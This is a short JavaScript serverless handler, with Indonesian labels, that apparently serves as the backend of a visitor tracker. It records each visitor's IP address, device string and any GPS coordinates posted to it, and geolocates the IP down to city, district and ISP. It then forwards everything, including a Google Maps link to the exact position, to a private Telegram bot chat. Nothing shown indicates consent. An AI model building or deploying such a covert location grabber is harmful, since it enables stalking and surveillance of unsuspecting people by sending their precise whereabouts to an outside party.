export default async function handler(req, res) {

    const TOKEN = process.env.TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (req.method !== "POST") {
        return res.status(200).send("OK");
    }

    const ip = req.headers["x-forwarded-for"] || "Unknown";
    const userAgent = req.headers["user-agent"];
    const waktu = new Date().toLocaleString();

    const { lat, lon, koneksi, type } = req.body || {};

    let maps = "Tidak tersedia";
    if (lat && lon) {
        maps = `https://maps.google.com/?q=${lat},${lon}`;
    }

    // Lokasi dari IP
    const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,district,isp`);
    const loc = await locRes.json();

    const lokasiIP = `
Negara: ${loc.country}
Provinsi: ${loc.regionName}
Kota: ${loc.city}
Daerah: ${loc.district || "-"}
ISP: ${loc.isp}
`;

    let pesan = "";

    if (type === "gps") {
        pesan = `📍 GPS AKURAT
IP: ${ip}
${lokasiIP}
Koneksi: ${koneksi || "-"}
Waktu: ${waktu}
Device: ${userAgent}
GPS: ${lat}, ${lon}
Maps: ${maps}`;
    } else {
        pesan = `📡 Visitor baru
IP: ${ip}
${lokasiIP}
Koneksi: ${koneksi || "-"}
Waktu: ${waktu}
Device: ${userAgent}`;
    }

    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan
        })
    });

    res.status(200).json({ status: "ok" });
}   
